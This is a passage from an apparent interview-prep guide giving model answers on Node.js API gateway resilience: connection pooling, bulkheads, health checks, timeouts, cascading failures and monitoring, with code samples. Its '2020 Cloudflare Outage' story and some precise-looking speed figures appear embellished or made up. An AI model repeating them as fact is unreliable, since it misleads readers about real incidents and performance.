  });
  
  // Attempt graceful shutdown
  gracefulShutdown('uncaughtException');
});

// 6. Express setup
app.use(express.json());
// ... routes ...
app.use(notFoundHandler);  // After all routes
app.use(errorHandler);     // Last middleware
```

**Alerting strategy:**
```javascript
function shouldAlert(error) {
  // Alert on:
  // - 500 errors (server errors)
  // - Database connection failures
  // - High error rate (>10 errors/min)
  // - Circuit breaker opens
  
  if (error.statusCode >= 500) {
    return true;
  }
  
  if (error.code === 'ECONNREFUSED' && error.message.includes('database')) {
    return true;
  }
  
  // Check error rate
  const errorCount = incrementErrorCount();
  if (errorCount > 10) {
    return true;
  }
  
  return false;
}

async function sendAlert(alert) {
  // Send to Slack
  await axios.post(SLACK_WEBHOOK_URL, {
    text: `🚨 ${alert.type.toUpperCase()}: ${alert.message}`,
    attachments: [{
      color: 'danger',
      fields: [
        { title: 'Request ID', value: alert.details.requestId },
        { title: 'URL', value: alert.details.url },
        { title: 'User', value: alert.details.userId || 'anonymous' }
      ]
    }]
  });
  
  // Send to PagerDuty for critical errors
  if (alert.details.statusCode === 500) {
    await axios.post(PAGERDUTY_API_URL, {
      event_action: 'trigger',
      payload: {
        summary: alert.message,
        severity: 'error',
        source: 'api-gateway'
      }
    });
  }
}
```

**Error response format:**
```json
{
  "success": false,
  "error": "Validation failed",
  "errors": [
    {
      "field": "email",
      "message": "Invalid email format"
    },
    {
      "field": "password",
      "message": "Password must be at least 8 characters"
    }
  ],
  "requestId": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Interview tip:** Emphasize the single source of truth for error handling, consistent error format for clients, comprehensive logging with request context, and alerting for critical errors."

---

## Q22: Explain database connection pooling and why it's critical

**Perfect Answer:**

"Connection pooling reuses database connections instead of creating new ones for each query. This is **90% faster** in production.

**Without Connection Pool (Slow):**
```javascript
// Every query creates new connection
async function getUser(id) {
  const client = new Client({
    host: 'localhost',
    port: 5432,
    database: 'mydb'
  });
  
  await client.connect();      // TCP handshake: 50ms
                                // TLS negotiation: 100ms
                                // Auth: 20ms
                                // Total overhead: 170ms
  
  const result = await client.query('SELECT * FROM users WHERE id = $1', [id]);  // Query: 5ms
  
  await client.end();           // Close: 5ms
  
  return result.rows[0];
  // Total: 180ms (mostly connection overhead!)
}

// 100 queries = 18 seconds!
```

**With Connection Pool (Fast):**
```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host: 'localhost',
  port: 5432,
  database: 'mydb',
  user: 'dbuser',
  password: process.env.DB_PASSWORD,
  
  // Pool configuration
  min: 5,         // Keep at least 5 connections alive
  max: 20,        // Allow max 20 concurrent connections
  
  idleTimeoutMillis: 30000,      // Close idle connections after 30s
  connectionTimeoutMillis: 2000,  // Wait max 2s for available connection
  
  // Keep connections alive
  keepAlive: true,
  keepAliveInitialDelayMillis: 10000
});

async function getUser(id) {
  // Get connection from pool (reused): 1ms
  const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);  // Query: 5ms
  // Connection automatically returned to pool
  
  return result.rows[0];
  // Total: 6ms (97% faster!)
}

// 100 queries = 0.6 seconds (30× faster!)
```

**Performance Numbers:**
```
Single query:
- Without pool: 180ms (170ms overhead + 10ms query)
- With pool: 6ms (1ms pool + 5ms query)
- Improvement: 97% faster!

100 concurrent queries:
- Without pool: 18 seconds (bottlenecked by connection creation)
- With pool: 0.6 seconds (queries run in parallel)
- Improvement: 30× faster!
```

**How connection pooling works:**
```
Initial state:
Pool: [conn1, conn2, conn3, conn4, conn5]  (5 idle connections)

Request 1 arrives:
Pool: [conn2, conn3, conn4, conn5]  (conn1 in use)
Query executes: 5ms
Pool: [conn1, conn2, conn3, conn4, conn5]  (conn1 returned)

10 requests arrive simultaneously:
Pool: []  (all 5 connections in use)
5 new connections created (still have capacity, max=20)
Pool: [conn6, conn7, conn8, conn9, conn10]
All 10 queries execute in parallel

Requests complete:
Pool: [conn1...conn10]  (all returned)
After 30s idle: close conn6-conn10
Pool: [conn1, conn2, conn3, conn4, conn5]  (back to min=5)
```

**Pool sizing formula:**
```javascript
// Optimal pool size = ((core_count * 2) + effective_spindle_count)
// For typical web server:
// - 4 CPU cores
// - SSD (effective_spindle_count = 1 for solid state)
// Optimal = (4 * 2) + 1 = 9

const pool = new Pool({
  min: 5,   // Keep 5 warm (handle normal traffic)
  max: 20   // Allow burst to 20 (handle spikes)
});
```

**Too small:**
```
max: 5
100 concurrent requests arrive
5 connections handle requests
95 requests wait in queue
Sequential processing (slow!)
```

**Too large:**
```
max: 100
Database overwhelmed
Too many connections = context switching overhead
Postgres default max: 100 (entire database limit!)
Other apps starved of connections
```

**Error handling:**
```javascript
pool.on('error', (err, client) => {
  logger.error('Unexpected error on idle client', {
    error: err.message
  });
  // Pool will automatically try to reconnect
});

pool.on('connect', (client) => {
  logger.info('New database connection established');
});

pool.on('acquire', (client) => {
  // Connection acquired from pool
});

pool.on('remove', (client) => {
  logger.info('Connection removed from pool');
});
```

**Graceful shutdown:**
```javascript
async function shutdown() {
  try {
    await pool.end();  // Close all connections
    logger.info('Database pool closed');
  } catch (error) {
    logger.error('Error closing pool', { error });
  }
}

process.on('SIGTERM', shutdown);
```

**Interview tip:** Emphasize the massive performance improvement (90%+), explain how pooling works (reuse connections), give the formula for sizing (core_count * 2 + spindle_count), and mention the trade-offs (too small = slow, too large = overwhelm database)."

---

## Q23: What is bulkhead isolation and when do you use it?

**Perfect Answer:**

"Bulkhead pattern isolates resources so failure in one service doesn't affect others. Named after ship bulkheads that prevent one flooded compartment from sinking the whole ship.

**The Problem (No Isolation):**
```javascript
// Single shared connection pool for all services
app.get('/api/orders', async (req, res) => {
  const orders = await axios.get('ORDER_SERVICE/orders');
  res.json(orders.data);
});

app.get('/api/users', async (req, res) => {
  const users = await axios.get('USER_SERVICE/users');
  res.json(users.data);
});

// Scenario: Order Service becomes slow (10s responses)
// 1. 100 requests to /api/orders arrive
// 2. All 100 connection pool slots occupied (waiting for Order Service)
// 3. Request to /api/users arrives
// 4. No connections available!
// 5. User Service request blocked (even though User Service is healthy)
// 6. Entire gateway blocked by one slow service
```

**The Solution (Bulkhead Isolation):**
```javascript
class BulkheadIsolator {
  constructor(options) {
    this.maxConcurrent = options.maxConcurrent || 10;
    this.maxQueue = options.maxQueue || 20;
    this.timeout = options.timeout || 30000;
    
    this.activeCount = 0;
    this.queue = [];
  }
  
  async execute(fn) {
    // Check if at capacity
    if (this.activeCount >= this.maxConcurrent) {
      // Queue is full, reject immediately
      if (this.queue.length >= this.maxQueue) {
        throw new Error('Bulkhead queue full');
      }
      
      // Wait in queue
      await new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          reject(new Error('Bulkhead queue timeout'));
        }, this.timeout);
        
        this.queue.push({ resolve, reject, timeout });
      });
    }
    
    // Execute
    this.activeCount++;
    
    try {
      const result = await fn();
      return result;
    } finally {
      this.activeCount--;
      
      // Process queue
      if (this.queue.length > 0) {
        const next = this.queue.shift();
        clearTimeout(next.timeout);
        next.resolve();
      }
    }
  }
  
  getStats() {
    return {
      active: this.activeCount,
      queued: this.queue.length,
      capacity: this.maxConcurrent
    };
  }
}

// Separate bulkhead per service
const bulkheads = {
  orderService: new BulkheadIsolator({ maxConcurrent: 30, maxQueue: 50 }),
  userService: new BulkheadIsolator({ maxConcurrent: 50, maxQueue: 100 }),
  productService: new BulkheadIsolator({ maxConcurrent: 100, maxQueue: 200 }),
  paymentService: new BulkheadIsolator({ maxConcurrent: 20, maxQueue: 10 })  // Critical, small pool
};

// Usage
app.get('/api/orders', async (req, res) => {
  const orders = await bulkheads.orderService.execute(() =>
    axios.get('ORDER_SERVICE/orders')
  );
  res.json(orders.data);
});

app.get('/api/users', async (req, res) => {
  const users = await bulkheads.userService.execute(() =>
    axios.get('USER_SERVICE/users')
  );
  res.json(users.data);
});
```

**Now with isolation:**
```
Scenario: Order Service slow (10s responses)
1. 100 requests to /api/orders arrive
2. 30 active (maxConcurrent), 50 queued (maxQueue), 20 rejected
3. Order Service bulkhead: FULL
4. Request to /api/users arrives
5. User Service bulkhead: 0/50 used (independent!)
6. User request succeeds immediately
7. Gateway remains healthy for other services
```

**Bulkhead sizing:**
```javascript
// Size based on service characteristics
const bulkheads = {
  // Fast, high-volume service (product catalog)
  productService: new BulkheadIsolator({
    maxConcurrent: 100,  // Can handle lots
    maxQueue: 200        // Allow queueing
  }),
  
  // Medium speed, medium volume (user service)
  userService: new BulkheadIsolator({
    maxConcurrent: 50,
    maxQueue: 100
  }),
  
  // Slow, lower volume (order processing)
  orderService: new BulkheadIsolator({
    maxConcurrent: 30,   // Fewer concurrent
    maxQueue: 50
  }),
  
  // Critical, slow (payment processing)
  paymentService: new BulkheadIsolator({
    maxConcurrent: 20,   // Protect payment service
    maxQueue: 10,        // Small queue (fail fast)
    timeout: 5000        // Short timeout
  })
};
```

**Monitoring:**
```javascript
// Expose bulkhead stats
app.get('/health', (req, res) => {
  const stats = {};
  
  for (const [service, bulkhead] of Object.entries(bulkheads)) {
    stats[service] = bulkhead.getStats();
  }
  
  res.json({
    status: 'healthy',
    bulkheads: stats
  });
});

// Example response:
{
  "status": "healthy",
  "bulkheads": {
    "orderService": {
      "active": 25,
      "queued": 10,
      "capacity": 30
    },
    "userService": {
      "active": 5,
      "queued": 0,
      "capacity": 50
    }
  }
}

// Alert if bulkhead near capacity
if (bulkhead.activeCount / bulkhead.maxConcurrent > 0.8) {
  logger.warn('Bulkhead near capacity', {
    service: serviceName,
    utilization: (bulkhead.activeCount / bulkhead.maxConcurrent * 100).toFixed(1) + '%'
  });
}
```

**Real-world analogy:**
```
Ship with bulkheads:
- Compartment 1: Engine room floods
- Bulkhead seals
- Compartments 2-5: Still dry
- Ship stays afloat

API Gateway with bulkheads:
- Order Service: Slow/down (30/30 threads used)
- Bulkhead isolates
- User/Product Services: Still fast (independent threads)
- Gateway stays responsive
```

**Interview tip:** Explain the ship analogy, show how one slow service doesn't block others, discuss bulkhead sizing based on service characteristics, and mention monitoring to detect when bulkheads are stressed."

---

## Q24: Deep health checks vs shallow health checks

**Perfect Answer:**

"Shallow checks verify the service is running. Deep checks verify it can actually serve traffic.

**Shallow Health Check:**
```javascript
// Just confirms process is alive
app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

// Problem: Service might be running but unable to serve requests
// - Database connection broken
// - Redis down
// - Disk full
// - Out of memory
// Load balancer thinks service is healthy, sends traffic, requests fail!
```

**Deep Health Check:**
```javascript
app.get('/health/live', (req, res) => {
  // Liveness: Is process alive?
  res.json({ status: 'ok' });
});

app.get('/health/ready', async (req, res) => {
  // Readiness: Can we serve traffic?
  const checks = {
    database: false,
    redis: false,
    orderService: false,
    diskSpace: false
  };
  
  try {
    // Check database
    await db.query('SELECT 1');
    checks.database = true;
  } catch (error) {
    logger.error('Database health check failed', { error });
  }
  
  try {
    // Check Redis
    await redis.ping();
    checks.redis = true;
  } catch (error) {
    logger.error('Redis health check failed', { error });
  }
  
  try {
    // Check dependent services
    await axios.get('ORDER_SERVICE/health', { timeout: 2000 });
    checks.orderService = true;
  } catch (error) {
    logger.error('Order service health check failed', { error });
  }
  
  try {
    // Check disk space
    const stats = await fs.promises.statfs('/');
    const freePercent = (stats.bavail / stats.blocks) * 100;
    checks.diskSpace = freePercent > 10;  // At least 10% free
  } catch (error) {
    logger.error('Disk space check failed', { error });
  }
  
  // Determine overall health
  const allHealthy = Object.values(checks).every(check => check === true);
  
  if (allHealthy) {
    res.json({
      status: 'healthy',
      checks
    });
  } else {
    res.status(503).json({  // 503 Service Unavailable
      status: 'unhealthy',
      checks
    });
  }
});
```

**Kubernetes Integration:**
```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: api-gateway
    image: api-gateway:latest
    
    # Liveness probe: Should we restart the pod?
    livenessProbe:
      httpGet:
        path: /health/live
        port: 3000
      initialDelaySeconds: 30  # Wait 30s after start
      periodSeconds: 10        # Check every 10s
      timeoutSeconds: 5        # 5s timeout
      failureThreshold: 3      # Restart after 3 failures
    
    # Readiness probe: Should we send traffic?
    readinessProbe:
      httpGet:
        path: /health/ready
        port: 3000
      initialDelaySeconds: 10  # Check after 10s
      periodSeconds: 5         # Check every 5s
      timeoutSeconds: 3        # 3s timeout
      failureThreshold: 2      # Remove from service after 2 failures
```

**Liveness vs Readiness:**

**Liveness (Should process be restarted?):**
```javascript
app.get('/health/live', (req, res) => {
  // Check if process is responsive
  // Don't check dependencies!
  // If this fails, Kubernetes restarts the pod
  
  res.json({ status: 'alive' });
});

// Liveness fails → Pod restart
// Use for: Deadlocks, hung processes, memory leaks
```

**Readiness (Should we send traffic?):**
```javascript
app.get('/health/ready', async (req, res) => {
  // Check if we can serve requests
  // Check all dependencies
  // If this fails, Kubernetes removes from service
  
  const ready = await checkDatabase() && await checkRedis();
  
  res.status(ready ? 200 : 503).json({
    status: ready ? 'ready' : 'not ready'
  });
});

// Readiness fails → Removed from load balancer
// Use for: Dependencies down, still starting up, overwhelmed
```

**Startup probe (New in Kubernetes 1.16):**
```yaml
# For slow-starting applications
startupProbe:
  httpGet:
    path: /health/startup
    port: 3000
  initialDelaySeconds: 0
  periodSeconds: 10
  failureThreshold: 30   # Allow 5 minutes to start (30 × 10s)

# Once startup succeeds, liveness/readiness take over
```

**Detailed health response:**
```javascript
app.get('/health/ready', async (req, res) => {
  const start = Date.now();
  
  const checks = await Promise.allSettled([
    checkDatabase(),
    checkRedis(),
    checkOrderService(),
    checkDiskSpace(),
    checkMemory()
  ]);
  
  const results = {
    status: checks.every(c => c.status === 'fulfilled') ? 'healthy' : 'degraded',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    checks: {
      database: formatCheck(checks[0]),
      redis: formatCheck(checks[1]),
      orderService: formatCheck(checks[2]),
      diskSpace: formatCheck(checks[3]),
      memory: formatCheck(checks[4])
    },
    duration: Date.now() - start  // How long health check took
  };
  
  const statusCode = results.status === 'healthy' ? 200 : 503;
  res.status(statusCode).json(results);
});

function formatCheck(result) {
  if (result.status === 'fulfilled') {
    return { status: 'ok', ...result.value };
  } else {
    return { status: 'error', error: result.reason.message };
  }
}

// Example response:
{
  "status": "degraded",
  "timestamp": "2024-01-15T10:30:00.000Z",
  "uptime": 86400,
  "checks": {
    "database": { "status": "ok", "latency": 5 },
    "redis": { "status": "error", "error": "Connection refused" },
    "orderService": { "status": "ok", "latency": 50 },
    "diskSpace": { "status": "ok", "free": "45%" },
    "memory": { "status": "ok", "used": "60%" }
  },
  "duration": 150
}
```

**Health check best practices:**

**1. Timeout health checks:**
```javascript
async function checkDatabase() {
  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Timeout')), 2000)
  );
  
  const queryPromise = db.query('SELECT 1');
  
  return Promise.race([queryPromise, timeoutPromise]);
}
```

**2. Cache health check results:**
```javascript
let lastHealthCheck = {
  result: null,
  timestamp: 0
};

app.get('/health/ready', async (req, res) => {
  // Cache for 5 seconds
  if (Date.now() - lastHealthCheck.timestamp < 5000) {
    return res.json(lastHealthCheck.result);
  }
  
  const result = await performHealthChecks();
  lastHealthCheck = {
    result,
    timestamp: Date.now()
  };
  
  res.json(result);
});
```

**3. Don't overwhelm dependencies:**
```javascript
// Use separate read-only database connection for health checks
const healthCheckPool = new Pool({
  ...dbConfig,
  max: 2  // Only 2 connections for health checks
});

async function checkDatabase() {
  return healthCheckPool.query('SELECT 1');
}
```

**Interview tip:** Explain the difference between liveness (restart if fails) and readiness (remove from load balancer if fails), show comprehensive health checks that verify all dependencies, and mention the importance of caching and timeouts to avoid overwhelming systems with health check traffic."

---

## Q25: How do you implement timeouts for operations?

**Perfect Answer:**

"Different operations need different timeouts. Never use default (infinite timeout).

**Problem with no timeouts:**
```javascript
// ❌ BAD: No timeout
const response = await axios.get('https://slow-service.com/data');
// If service never responds, request hangs forever
// Connections stay open
// Eventually exhaust connection pool
// Gateway becomes unresponsive
```

**Solution: Operation-specific timeouts**
```javascript
// Timeout per operation type
const TIMEOUTS = {
  database: 5000,        // 5s - database queries should be fast
  redis: 1000,           // 1s - Redis is very fast
  internalService: 10000, // 10s - internal microservices
  externalAPI: 30000,    // 30s - external APIs can be slower
  fileUpload: 300000     // 5min - large file uploads
};

// Database timeout
async function getUser(id) {
  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Database timeout')), TIMEOUTS.database)
  );
  
  const queryPromise = db.query('SELECT * FROM users WHERE id = $1', [id]);
  
  try {
    return await Promise.race([queryPromise, timeoutPromise]);
  } catch (error) {
    if (error.message === 'Database timeout') {
      logger.error('Database query timeout', { userId: id });
      throw new Error('Request timeout');
    }
    throw error;
  }
}

// HTTP request timeout
async function callUserService(endpoint) {
  try {
    const response = await axios.get(`${USER_SERVICE_URL}${endpoint}`, {
      timeout: TIMEOUTS.internalService,
      
      // Also set socket timeout
      httpAgent: new http.Agent({ timeout: TIMEOUTS.internalService }),
      httpsAgent: new https.Agent({ timeout: TIMEOUTS.internalService })
    });
    
    return response.data;
  } catch (error) {
    if (error.code === 'ECONNABORTED') {
      logger.error('Service call timeout', { endpoint, timeout: TIMEOUTS.internalService });
      throw new Error('Service unavailable');
    }
    throw error;
  }
}
```

**Cascading timeouts:**
```javascript
// Parent timeout should be > sum of child timeouts
async function getOrderDetails(orderId) {
  // This operation has 3 sub-operations
  const PARENT_TIMEOUT = 35000;  // 35s
  
  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Operation timeout')), PARENT_TIMEOUT)
  );
  
  const operationPromise = (async () => {
    // Sub-operation 1: Get order (10s timeout)
    const order = await getOrder(orderId);  // 10s
    
    // Sub-operation 2: Get user (10s timeout)
    const user = await getUser(order.userId);  // 10s
    
    // Sub-operation 3: Get products (10s timeout)
    const products = await getProducts(order.productIds);  // 10s
    
    return { order, user, products };
  })();
  
  return Promise.race([operationPromise, timeoutPromise]);
}
// Parent: 35s (allows buffer for 3 × 10s operations)
```

**Request-level timeout middleware:**
```javascript
function timeoutMiddleware(ms) {
  return (req, res, next) => {
    req.setTimeout(ms, () => {
      logger.error('Request timeout', {
        url: req.url,
        method: req.method,
        timeout: ms
      });
      
      res.status(408).json({
        error: 'Request timeout',
        timeout: ms
      });
    });
    
    next();
  };
}

// Apply different timeouts per route
app.use('/api/quick', timeoutMiddleware(5000));   // 5s
app.use('/api/normal', timeoutMiddleware(30000));  // 30s
app.use('/api/slow', timeoutMiddleware(60000));    // 60s
```

**Circuit breaker timeout:**
```javascript
const circuitBreaker = new CircuitBreaker(callService, {
  timeout: 10000,      // Individual request timeout
  errorThresholdPercentage: 50,
  resetTimeout: 30000
});

// If requests timeout repeatedly, circuit opens
// Subsequent requests fail fast (no timeout wait)
```

**Timeout with cleanup:**
```javascript
async function processWithTimeout(data, timeoutMs) {
  let timeoutId;
  let cleanup;
  
  const timeoutPromise = new Promise((_, reject) => {
    timeoutId = setTimeout(() => {
      reject(new Error('Operation timeout'));
      
      // Cleanup on timeout
      if (cleanup) {
        cleanup();
      }
    }, timeoutMs);
  });
  
  const operationPromise = (async () => {
    const resource = await acquireResource();
    
    // Register cleanup function
    cleanup = () => releaseResource(resource);
    
    try {
      const result = await processData(data, resource);
      return result;
    } finally {
      cleanup();
    }
  })();
  
  try {
    return await Promise.race([operationPromise, timeoutPromise]);
  } finally {
    clearTimeout(timeoutId);
  }
}
```

**Configurable timeouts:**
```javascript
// .env
DATABASE_TIMEOUT=5000
REDIS_TIMEOUT=1000
INTERNAL_SERVICE_TIMEOUT=10000
EXTERNAL_API_TIMEOUT=30000

// config.js
module.exports = {
  timeouts: {
    database: parseInt(process.env.DATABASE_TIMEOUT) || 5000,
    redis: parseInt(process.env.REDIS_TIMEOUT) || 1000,
    internalService: parseInt(process.env.INTERNAL_SERVICE_TIMEOUT) || 10000,
    externalAPI: parseInt(process.env.EXTERNAL_API_TIMEOUT) || 30000
  }
};

// Can adjust per environment:
// Production: Stricter (fast fail)
// Development: Looser (debugging)
```

**Monitoring timeout metrics:**
```javascript
const timeoutMetrics = {
  database: { count: 0, totalTime: 0 },
  redis: { count: 0, totalTime: 0 },
  services: { count: 0, totalTime: 0 }
};

async function queryWithMetrics(query, timeout) {
  const start = Date.now();
  
  try {
    const result = await Promise.race([
      db.query(query),
      timeoutAfter(timeout)
    ]);
    
    const duration = Date.now() - start;
    timeoutMetrics.database.totalTime += duration;
    
    // Alert if approaching timeout
    if (duration > timeout * 0.8) {
      logger.warn('Query approaching timeout', { duration, timeout });
    }
    
    return result;
  } catch (error) {
    if (error.message === 'Timeout') {
      timeoutMetrics.database.count++;
      logger.error('Database timeout', { query, timeout });
    }
    throw error;
  }
}

// Expose metrics
app.get('/metrics/timeouts', (req, res) => {
  res.json({
    database: {
      timeouts: timeoutMetrics.database.count,
      avgDuration: timeoutMetrics.database.totalTime / (timeoutMetrics.database.count || 1)
    },
    // ... other metrics
  });
});
```

**Interview tip:** Explain that different operations need different timeouts (fast for Redis, slower for external APIs), show how to implement with Promise.race, discuss cascading timeouts (parent > sum of children), and mention monitoring to detect operations approaching their timeout."

---

## Q26: Explain cascading failures and how to prevent them

**Perfect Answer:**

"Cascading failure is when failure of one component causes failure of dependent components, like falling dominoes.

**Example Cascade:**
```
1. Payment Service slow (10s response time instead of 100ms)
2. Order Service waits for Payment Service
   - 100 requests arrive
   - All wait 10s
   - Thread pool exhausted
3. API Gateway calls Order Service
   - Waits for available thread
   - Request timeout (30s)
   - Connection pool exhausted
4. All services downstream affected
5. Entire system down
```

**Prevention strategies:**

**1. Timeouts (Prevent blocking forever)**
```javascript
// Every call has timeout
async function createOrder(data) {
  try {
    const order = await axios.post('ORDER_SERVICE/orders', data, {
      timeout: 10000  // 10s timeout
    });
    
    return order.data;
  } catch (error) {
    if (error.code === 'ECONNABORTED') {
      // Timeout - fail fast instead of waiting forever
      throw new Error('Order service timeout');
    }
    throw error;
  }
}
```

**2. Circuit Breaker (Stop calling failing service)**
```javascript
const orderServiceBreaker = new CircuitBreaker(callOrderService, {
  timeout: 10000,
  errorThresholdPercentage: 50,  // Open after 50% failures
  resetTimeout: 30000
});

// Once open, requests fail immediately (<1ms)
// Prevents hammering dead service
const order = await orderServiceBreaker.fire(orderData);
```

**3. Bulkhead Isolation (Isolate failures)**
```javascript
const bulkheads = {
  orderService: new Bulkhead({ maxConcurrent: 30 }),
  paymentService: new Bulkhead({ maxConcurrent: 20 }),
  userService: new Bulkhead({ maxConcurrent: 50 })
};

// Payment Service slow?
// - Only paymentService bulkhead affected
// - orderService and userService still fast
// - Gateway remains responsive
```

**4. Rate Limiting (Prevent overload)**
```javascript
// Limit requests per service
const limiter = new RateLimiter({
  orderService: { max: 100, window: 1000 },  // 100 req/sec
  paymentService: { max: 50, window: 1000 }  // 50 req/sec
});

// Prevents suddenly overwhelming services during issues
```

**5. Load Shedding (Reject excess load)**
```javascript
app.use((req, res, next) => {
  const load = process.cpuUsage().system / 1000000 / os.cpus().length;
  
  if (load > 0.8) {  // 80% CPU
    logger.warn('High load, shedding requests', { load });
    
    return res.status(503).json({
      error: 'Service temporarily unavailable',
      retryAfter: 10
    });
  }
  
  next();
});
```

**6. Backpressure (Signal upstream to slow down)**
```javascript
// When overwhelmed, tell clients to slow down
if (queueDepth > MAX_QUEUE) {
  res.status(429).json({
    error: 'Too many requests',
    retryAfter: 30
  });
}
```

**7. Fallback Responses (Graceful degradation)**
```javascript
async function getProductDetails(id) {
  try {
    return await productService.getProduct(id);
  } catch (error) {
    // Service down? Return cached data
    logger.warn('Product service down, using cache');
    
    const cached = await redis.get(`product:${id}`);
    if (cached) {
      return JSON.parse(cached);
    }
    
    // No cache? Return minimal data
    return {
      id,
      name: 'Product unavailable',
      price: null,
      available: false
    };
  }
}
```

**8. Connection Pool Limits (Prevent connection exhaustion)**
```javascript
const pool = new Pool({
  max: 20,  // Limit connections
  connectionTimeoutMillis: 2000  // Fail fast if pool exhausted
});

// Prevents queueing up unlimited connections
```

**9. Health Checks (Remove unhealthy instances)**
```javascript
// Load balancer checks health every 5s
app.get('/health', async (req, res) => {
  const healthy = await checkDependencies();
  
  if (!healthy) {
    // 503 = remove from load balancer
    // Stop sending traffic to unhealthy instance
    return res.status(503).json({ status: 'unhealthy' });
  }
  
  res.json({ status: 'healthy' });
});
```

**10. Retry with Exponential Backoff (Don't overwhelm recovering service)**
```javascript
// When service recovers, clients retry
// With backoff, requests spread out
// Without backoff, thundering herd re-overwhelms service

const retry = new RetryStrategy({
  maxAttempts: 3,
  baseDelay: 100,
  backoffFactor: 2,
  jitter: true  // Spread out retries
});

// Attempt 1: Immediate
// Attempt 2: 100ms ± jitter
// Attempt 3: 200ms ± jitter
// Requests spread over ~300ms instead of all at once
```

**Complete defense-in-depth:**
```javascript
// Layer 1: Rate limit (prevent overload)
app.use(rateLimiter);

// Layer 2: Timeout (prevent blocking)
app.use(timeoutMiddleware(30000));

// Layer 3: Bulkhead (isolate failures)
async function callService(service, fn) {
  return bulkheads[service].execute(fn);
}

// Layer 4: Circuit breaker (stop calling failing service)
async function protectedCall(service, fn) {
  return circuitBreakers[service].fire(fn);
}

// Layer 5: Retry (handle transient failures)
async function resilientCall(fn) {
  return retryStrategy.execute(fn);
}

// Layer 6: Fallback (graceful degradation)
async function callWithFallback(fn, fallback) {
  try {
    return await fn();
  } catch (error) {
    logger.warn('Falling back', { error });
    return fallback();
  }
}

// All layers together:
async function getOrder(id) {
  return callWithFallback(
    () => resilientCall(
      () => protectedCall('orderService',
        () => callService('orderService',
          () => axios.get(`ORDER_SERVICE/orders/${id}`, { timeout: 10000 })
        )
      )
    ),
    () => getCachedOrder(id)
  );
}
```

**Real-world incident:**
```
2020 Cloudflare Outage:
- Single service had memory spike
- No bulkhead isolation
- Cascaded to API gateway
- Gateway overwhelmed
- Cascaded to DNS
- DNS down = entire internet impacted

Prevention:
- Bulkhead isolation (memory spike contained)
- Circuit breaker (stop calling bad service)
- Health checks (remove unhealthy instances)
- Fallback (serve stale DNS records)
```

**Interview tip:** Explain the domino effect, show multiple prevention layers (circuit breaker, bulkhead, timeouts, fallbacks), and emphasize that you need ALL layers - no single pattern is sufficient."

---

## Q27: How do you implement monitoring and alerting?

**Perfect Answer:**

"Four pillars: Metrics, Logs, Traces, Alerts.

**1. Metrics (What's happening)**
```javascript
const promClient = require('prom-client');

// Create metrics
const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status'],
  buckets: [0.1, 0.5, 1, 2, 5]  // Buckets for histogram
});

const httpRequestTotal = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status']
});

const activeConnections = new promClient.Gauge({
  name: 'active_connections',
  help: 'Number of active connections'
});

const circuitBreakerStatus = new promClient.Gauge({
  name: 'circuit_breaker_status',
  help: 'Circuit breaker status (0=closed, 1=open, 2=half-open)',
  labelNames: ['service']
});

// Middleware to record metrics
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    
    httpRequestDuration
      .labels(req.method, req.route?.path || req.path, res.statusCode)
      .observe(duration);
    
    httpRequestTotal
      .labels(req.method, req.route?.path || req.path, res.statusCode)
      .inc();
  });
  
  next();
});

// Expose metrics endpoint
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', promClient.register.contentType);
  res.end(await promClient.register.metrics());
});
```

**2. Prometheus + Grafana dashboards:**
```yaml
# prometheus.yml
scrape_configs:
  - job_name: 'api-gateway'
    scrape_interval: 15s
    static_configs:
      - targets: ['api-gateway:3000']
```

**Grafana queries:**
```promql
# Request rate
rate(http_requests_total[5m])

# Error rate
rate(http_requests_total{status=~"5.."}[5m])

# P95 latency
histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))

# P99 latency
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))

# Circuit breaker open count
sum(circuit_breaker_status{status="open"})
```

**3. Structured Logging**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: {
    service: 'api-gateway',
    environment: process.env.NODE_ENV
  },
  transports: [
    // Console (development)
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    
    // File (production)
    new winston.transports.File({
      filename: 'logs/error.log',
      level: 'error'
    }),
    new winston.transports.File({
      filename: 'logs/combined.log'
    })
  ]
});

// Request logging with context
app.use((req, res, next) => {
  req.id = uuidv4();
  req.logger = logger.child({
    requestId: req.id,
    userId: req.user?.id,
    ip: req.ip
  });
  
  next();
});

// Log requests
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    req.logger.info('Request completed', {
      method: req.method,
      url: req.url,
      status: res.statusCode,
      duration: Date.now() - start
    });
  });
  
  next();
});
```

**4. Distributed Tracing (Request flow across services)**
```javascript
const opentelemetry = require('@opentelemetry/api');
const { NodeTracerProvider } = require('@opentelemetry/sdk-trace-node');
const { SimpleSpanProcessor } = require('@opentelemetry/sdk-trace-base');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

// Setup tracing
const provider = new NodeTracerProvider();
const exporter = new JaegerExporter({
  serviceName: 'api-gateway',
  endpoint: 'http://jaeger:14268/api/traces'
});

provider.addSpanProcessor(new SimpleSpanProcessor(exporter));
provider.register();

const tracer = opentelemetry.trace.getTracer('api-gateway');

// Trace requests
app.use((req, res, next) => {
  const span = tracer.startSpan('http_request', {
    attributes: {
      'http.method': req.method,
      'http.url': req.url,
      'http.user_agent': req.get('user-agent')
    }
  });
  
  req.span = span;
  
  res.on('finish', () => {
